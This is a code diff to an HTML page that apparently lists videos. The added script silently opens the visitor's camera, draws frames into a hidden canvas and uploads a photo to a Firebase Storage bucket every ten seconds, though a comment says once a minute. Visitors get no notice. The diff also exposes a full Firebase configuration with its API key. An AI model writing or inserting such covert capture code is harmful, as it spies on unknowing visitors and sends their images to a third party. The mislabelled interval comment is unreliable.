@@ -69,6 +69,9 @@
         <!-- Videos will be dynamically inserted here -->
     </div>
 
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
     <script type="module">
         // 動画URLとタイトルのリストをここに配置
         const videos = [
@@ -285,6 +288,59 @@
 
         // ページロード時に動画をロード
         window.onload = loadVideos;
+
+	        // Firebase設定
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+
+        const firebaseConfig = {
+	  apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+	  authDomain: "nou-no-circle.firebaseapp.com",
+	  projectId: "nou-no-circle",
+	  storageBucket: "nou-no-circle.appspot.com",
+	  messagingSenderId: "756338805186",
+	  appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+	  measurementId: "G-TWBV38P13D"
+        };
+
+        // Firebase初期化
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        // カメラアクセス
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error('カメラアクセスエラー:', err);
+            });
+
+        // 画像をFirebase Storageにアップロード
+        function uploadImage(dataURL) {
+            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+            uploadString(storageRef, dataURL, 'data_url')
+                .then(snapshot => {
+                    console.log('画像がアップロードされました。');
+                })
+                .catch(err => {
+                    console.error('アップロードエラー:', err);
+                });
+        }
+
+        // 1分ごとに撮影してアップロード
+        setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg');
+            uploadImage(dataURL);
+        }, 10000); // 60000ミリ秒 = 1分
+
     </script>
 </body>
 </html>
